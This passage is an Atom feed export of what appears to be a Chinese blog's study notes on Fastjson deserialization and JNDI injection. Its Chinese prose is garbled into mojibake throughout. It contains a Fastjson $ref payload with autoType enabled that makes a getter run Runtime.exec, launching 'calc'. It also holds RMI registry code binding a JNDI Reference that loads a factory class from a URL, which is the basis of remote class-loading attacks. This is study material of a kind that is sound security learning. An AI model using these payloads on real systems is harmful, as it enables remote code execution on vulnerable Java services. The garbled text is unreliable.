·çš„è¯ä¼šæŠŠè¿™ä¸ªæ•´ä½“å½“åšä¸€ä¸ªJSONObjectï¼Œä¼šæŠŠè¿™ä¸ªå½“åškeyï¼Œå€¼ä¸ºbbb</p><p>å°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼ˆå› ä¸ºkeyä¸€å®šè¦æ˜¯Stringç±»å‹ï¼‰</p><p>è€Œä¸”JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œå½“è°ƒç”¨<code>toString</code>çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteræ–¹æ³•è·å–å€¼ã€‚æ‰€ä»¥ä¼šè°ƒç”¨åˆ°<code>getConnection</code>æ–¹æ³•ã€‚</p><p><img src="/2024/08/01/fastjson/image-20240801222706621.png" alt="image-20240801222706621"></p><p>å½“fastjson&gt;&#x3D;1.2.36çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>$ref</code>æ–¹å¼è°ƒç”¨getterã€‚</p><p>refæ˜¯fastjsonç‰¹æœ‰çš„JSONPathè¯­æ³•ï¼Œç”¨æ¥å¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ref_fastjson.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.demo.fastjson.test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŸç”Ÿååºåˆ—åŒ–"><a href="#åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="åŸç”Ÿååºåˆ—åŒ–"></a>åŸç”Ÿååºåˆ—åŒ–</h3><p>æ¥è‡ªY4ä½¬ï¼š</p><p><a href="https://paper.seebug.org/2055/">FastJson ä¸åŸç”Ÿååºåˆ—åŒ– (seebug.org)</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ) (y4tacker.github.io)</a></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸ƒä¸ƒå…«å…«æŠ„äº†ä¸€äº›ï¼Œæ‰“æ¯”èµ›çš„æ—¶å€™é‡åˆ°fastjsonä¹ŸæŒºå¤šçš„ï¼Œå¤šå­¦ä¹ å­¦ä¹ ã€‚ä½†fastjsonä¹Ÿé€æ¸æ·¡å‡ºè§†é‡äº†ã€‚</p><p>ç°åœ¨java8çš„é¢˜å°†è¦æ­»å»ï¼Œå‡ºç°æ›´å¤šçš„java11ã€java17ï¼Œè¿™éƒ½æ˜¯æ–°çš„æŒ‘æˆ˜ï¼Œå› ä¸ºæ¶‰åŠåˆ°å…¨æ–°çš„æ€è·¯ä¸æ–¹æ³•ã€‚</p><p>ç°åœ¨æˆ‘åªä¸è¿‡æ˜¯æ²¿ç€å‰äººçš„é“è·¯ä¸€æ­¥æ­¥ç­‘åŸºç½¢äº†ã€‚</p><p>Jacksonè·Ÿfastjsonå¾ˆåƒï¼Œæ”¾åœ¨åé¢å†™ã€‚</p><p>ä»¥åŠæœ€åé™„ä¸Šsu18å¤§ä½¬çš„ï¼Œå¸¸çœ‹å¸¸æ–°ï¼š</p><p><a href="https://su18.org/post/fastjson/#%E4%B8%80-%E7%AE%80%E4%BB%8B">fastjsonï¼šæˆ‘ä¸€è·¯å‘åŒ—ï¼Œç¦»å¼€æœ‰ä½ çš„å­£èŠ‚ | ç´ åå…« (su18.org)</a></p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson">FastJson ğŸª | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2024/07/30/JNDI/"/>
    <url>/2024/07/30/JNDI/</url>
    
    <content type="html"><![CDATA[<p>JNDIå®ƒç»ˆäºæ¥äº†ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯JNDIã€‚</p><p>JNDI(<code>Java Naming and Directory Interface</code>)ï¼šJavaå‘½åä¸ç›®å½•æ¥å£</p><p>æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿Javaåº”ç”¨ç¨‹åºèƒ½å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚</p><p>ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚</p><p><strong>Naming Service å‘½åæœåŠ¡ï¼š</strong> æŠŠä¸€ä¸ªæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”ã€‚åœ¨ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸­å¹¶ä¸ç›´æ¥å°†å¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œè€Œæ˜¯å­˜å‚¨äº†å¯¹è±¡çš„å¼•ç”¨ï¼Œå¼•ç”¨åŒ…å«äº†å¦‚ä½•è®¿é—®å®é™…å¯¹è±¡çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæŒ‡é’ˆã€‚</p><ul><li><strong>Bindings</strong>: è¡¨ç¤ºä¸€ä¸ªåç§°å’Œå¯¹åº”å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åç»‘å®šåˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œåœ¨ DNS ä¸­åŸŸåç»‘å®šåˆ°å¯¹åº”çš„ IPã€‚</li><li><strong>Context</strong>: ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­å¯¹åº”ç€ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åç§°å¯¹åº”çš„å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå…¶ä¸­å­ç›®å½•ä¹Ÿå¯ä»¥ç§°ä¸ºå­ä¸Šä¸‹æ–‡ (<code>subcontext</code>)ã€‚</li><li><strong>References</strong>: å½“å­˜åœ¨ä¸Šè¿°çš„ç‰¹æ®Šæƒ…å†µæ—¶ï¼Œä»¥å¼•ç”¨çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå¯ä»¥ç†è§£ä¸ºæŒ‡é’ˆã€‚å¼•ç”¨ä¸­åŒ…å«äº†è·å–å®é™…å¯¹è±¡æ‰€éœ€çš„ä¿¡æ¯ï¼Œç”šè‡³å¯¹è±¡çš„å®é™…çŠ¶æ€ã€‚æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…æ ¹æ®åç§°æ‰“å¼€çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ•´æ•° fd ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªå¼•ç”¨å€¼å»æ‰¾åˆ°ç£ç›˜ä¸­çš„å¯¹åº”ä½ç½®å’Œè¯»å†™åç§»ã€‚</li></ul><p><strong>Directory Service ç›®å½•æœåŠ¡ï¼š</strong> åœ¨å‘½ååŸºç¡€ä¸Šå¢åŠ äº†å±æ€§ï¼ˆæ–‡ä»¶ç›®å½•ä¸­æ¯ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½æœ‰å±æ€§ï¼šå¦‚åˆ›å»ºæ—¶é—´ã€è¯»å†™æ‰§è¡Œæƒé™ï¼‰ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾(<strong>lookup</strong>)å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢(<strong>search</strong>)å¯¹è±¡ã€‚</p><p>åº”ç”¨é€šè¿‡JNDIä¸å…·ä½“çš„ç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ä»è®¾è®¡ä¸Šï¼ŒJNDI ç‹¬ç«‹äºå…·ä½“çš„ç›®å½•æœåŠ¡å®ç°ï¼Œè®¾è®¡å‡ºäº†åº”ç”¨èŒƒå›´å®½æ³›çš„(ä¹Ÿå°±æ˜¯å…¼å®¹æ€§æ¯”è¾ƒå¼ºå¤§)ï¼Œå› æ­¤å¯ä»¥é’ˆå¯¹ä¸åŒçš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€çš„æ“ä½œæ¥å£ã€‚</p><p><img src="/2024/07/30/JNDI/image-20240730190919769.png" alt="image-20240730190919769"></p><p>SPI å…¨ç§°ä¸º Service Provider Interfaceï¼Œå³æœåŠ¡ä¾›åº”æ¥å£ï¼Œä¸»è¦ä½œç”¨æ˜¯<strong>ä¸ºåº•å±‚çš„å…·ä½“çš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£</strong>ï¼Œä»è€Œå®ç°ç›®å½•æœåŠ¡çš„å¯æ’æ‹”å¼å®‰è£…ã€‚åœ¨ JDK ä¸­åŒ…å«äº†ä¸‹è¿°å†…ç½®çš„ç›®å½•æœåŠ¡:</p><ul><li>RMIï¼šRemote Method Invocation è¿œç¨‹æ–¹æ³•è°ƒç”¨</li><li>LDAPï¼šLightweight Directory Access Protocol è½»é‡çº§ç›®å½•è®¿é—®åè®®</li><li>CORBAï¼šCommon Object Request Broker Architecture é€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„</li></ul><p>åœ¨ Java JDK é‡Œé¢æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·javax.namingï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œ,åŒ…å«äº†è®¿é—®ç›®å½•æœåŠ¡æ‰€éœ€çš„ç±»å’Œæ¥å£ï¼Œæ¯”å¦‚ Contextã€Bindingsã€Referencesã€lookup ç­‰ã€‚<br><br>Â·javax.naming.directoryï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir- Contextç±»ï¼›<br><br>Â·javax.naming.eventï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ï¼›<br><br>Â·javax.naming.ldapï¼šæä¾›LDAPæ”¯æŒï¼›<br><br>Â·javax.naming.spiï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ã€‚<br></code></pre></td></tr></table></figure><h2 id="å…±æœ‰ç±»Common-Class"><a href="#å…±æœ‰ç±»Common-Class" class="headerlink" title="å…±æœ‰ç±»Common Class"></a>å…±æœ‰ç±»Common Class</h2><h3 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»:"></a><code>InitialContext</code>ç±»:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext() æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚ <br><br>InitialContext(<span class="hljs-type">boolean</span> lazy) æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚ <br><br>InitialContext(Hashtable environment) ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚<br></code></pre></td></tr></table></figure><p>æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">bind(Name name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚ <br>list(String name) æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚ <br>lookup(String name) æ£€ç´¢å‘½åå¯¹è±¡ã€‚ <br>rebind(String name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ <br>unbind(String name) å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><h3 id="Referencesç±»ï¼š"><a href="#Referencesç±»ï¼š" class="headerlink" title="Referencesç±»ï¼š"></a><code>References</code>ç±»ï¼š</h3><p>åœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°åœ°å€åˆ—è¡¨çš„æœ«å°¾ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> æ£€ç´¢åœ°å€ç±»å‹ä¸ºâ€œaddrTypeâ€çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚<br>Enumeration <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚<br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚<br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚<br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚<br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚<br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jndi</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>; <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;aa&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹åˆ°<code>Reference</code>,å¹¶æ²¡æœ‰å®ç°<code>Remote</code>æ¥å£ä¹Ÿæ²¡æœ‰ç»§æ‰¿ <code>UnicastRemoteObject</code>ç±»ï¼Œå‰é¢è®²RMIçš„æ—¶å€™è¯´è¿‡ï¼Œå°†ç±»æ³¨å†Œåˆ°<code>Registry</code>éœ€è¦å®ç°<code>Remote</code>å’Œç»§æ‰¿<code>UnicastRemoteObject</code>ç±»ã€‚</p><p>è¿™é‡Œå¹¶æ²¡æœ‰çœ‹åˆ°ç›¸å…³çš„ä»£ç ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦è°ƒç”¨<code>ReferenceWrapper</code>å°†ä»–ç»™å°è£…ä¸€ä¸‹ã€‚</p><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>LDAP(<code>Lightweight Directory Access Protocol</code>)ï¼šè½»é‡ç›®å½•è®¿é—®åè®®</p><p>ç±»ä¼¼äºæ•°æ®åº“ã€‚</p><p>1.<br>   åŸºäºTCP&#x2F;IPåè®®<br>2. åˆ†æˆæœåŠ¡ç«¯&#x2F;å®¢æˆ·ç«¯ï¼šæœåŠ¡ç«¯å­˜å‚¨æ•°æ®ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥è¿›è¡Œæ“ä½œ<br>3. ç›¸å¯¹äº<code>mysql</code>çš„è¡¨å‹å­˜å‚¨ï¼Œä¸åŒçš„æ˜¯<code>LDAP</code>ä½¿ç”¨<strong>æ ‘å‹å­˜å‚¨</strong></p><ul><li><code>dn</code>ï¼š<code>domain name</code>ç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªé¡¹ï¼Œç±»ä¼¼äºMYSQLä¸»é”®<ul><li><code>dc</code>: <code>domain compose</code></li><li><code>ou</code>ï¼š<code>organization unit</code></li><li><code>uid</code></li></ul></li></ul><p>LDAPåè®®ä¸»è¦ç”¨äºå•ç‚¹ç™»å½•SSO(Single Sign on)</p><h2 id="JNDI-Attack"><a href="#JNDI-Attack" class="headerlink" title="JNDI Attack"></a>JNDI Attack</h2><p>ä¸ºäº†åœ¨å‘½åæœåŠ¡æˆ–ç›®å½•æœåŠ¡ä¸­ç»‘å®š<code>Java</code>å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>Java</code>åºåˆ—åŒ–æ¥ä¼ è¾“å¯¹è±¡ï¼Œä½†æœ‰æ—¶å€™ä¸å¤ªåˆé€‚ï¼Œæ¯”å¦‚<code>Java</code>å¯¹è±¡è¾ƒå¤§çš„æƒ…å†µã€‚</p><p>å› æ­¤JNDIå®šä¹‰äº†å‘½åå¼•ç”¨(<code>Naming References</code>)ï¼Œåé¢ç›´æ¥ç®€ç§°å¼•ç”¨(<code>References</code>)ã€‚</p><p>è¿™æ ·å¯¹è±¡å°±å¯ä»¥é€šè¿‡ç»‘å®šä¸€ä¸ªå¯ä»¥è¢«å‘½åç®¡ç†å™¨(<code>Naming Manager</code>)è§£ç (<code>decodeObject</code>)å¹¶è§£æä¸ºåŸå§‹å¯¹è±¡çš„å¼•ç”¨ï¼Œé—´æ¥åœ°å­˜å‚¨åœ¨å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ã€‚</p><p>å¼•ç”¨ç”±<code>Reference</code>ç±»æ¥è¡¨ç¤ºï¼Œå®ƒç”±åœ°å€(<code>RefAddress</code>)çš„æœ‰åºåˆ—è¡¨å’Œæ‰€å¼•ç”¨å¯¹è±¡çš„ä¿¡æ¯ç»„æˆã€‚è€Œæ¯ä¸ªåœ°å€åŒ…å«äº†å¦‚ä½•æ„é€ å¯¹åº”çš„å¯¹è±¡çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¼•ç”¨å¯¹è±¡çš„<code>Java</code>ç±»åï¼Œä»¥åŠç”¨äºåˆ›å»ºå¯¹è±¡çš„<code>ObjectFactory</code>ç±»çš„åç§°å’Œä½ç½®ã€‚ </p><p><code>Reference</code>å¯ä»¥ä½¿ç”¨<code>ObjectFactory</code>æ¥æ„é€ å¯¹è±¡ã€‚å½“ä½¿ç”¨<code>lookup()</code>æ–¹æ³•æŸ¥æ‰¾å¯¹è±¡æ—¶ï¼Œ<code>Reference</code>å°†ä½¿ç”¨æä¾›çš„<code>ObjectFactory</code>ç±»çš„åŠ è½½åœ°å€æ¥åŠ è½½<code>ObjectFactory</code>ç±»ï¼Œ<code>ObjectFactory</code>ç±»å°†æ„é€ å‡ºéœ€è¦çš„å¯¹è±¡ã€‚</p><p><strong>æ‰€è°“çš„ <code>JNDI</code> æ³¨å…¥å°±æ˜¯æ§åˆ¶ <code>lookup</code> å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ ·æ¥ä½¿å®¢æˆ·ç«¯è®¿é—®æ¶æ„çš„ <code>RMI</code> æˆ–è€… <code>LDAP</code> æœåŠ¡æ¥åŠ è½½æ¶æ„çš„å¯¹è±¡ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œå®Œæˆåˆ©ç”¨ã€‚</strong> </p><p>åœ¨ <code>JNDI</code> æœåŠ¡ä¸­ï¼Œé€šè¿‡ç»‘å®šä¸€ä¸ªå¤–éƒ¨è¿œç¨‹å¯¹è±¡è®©å®¢æˆ·ç«¯è¯·æ±‚ï¼Œä»è€Œä½¿å®¢æˆ·ç«¯æ¶æ„ä»£ç æ‰§è¡Œçš„æ–¹å¼å°±æ˜¯åˆ©ç”¨ <code>Reference</code> ç±»å®ç°çš„ã€‚<code>Reference</code> ç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å&#x2F;ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚</p><p>å…·ä½“åˆ™æ˜¯æŒ‡å¦‚æœè¿œç¨‹è·å– <code>RMI</code> æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ä¸º <code>Reference</code> 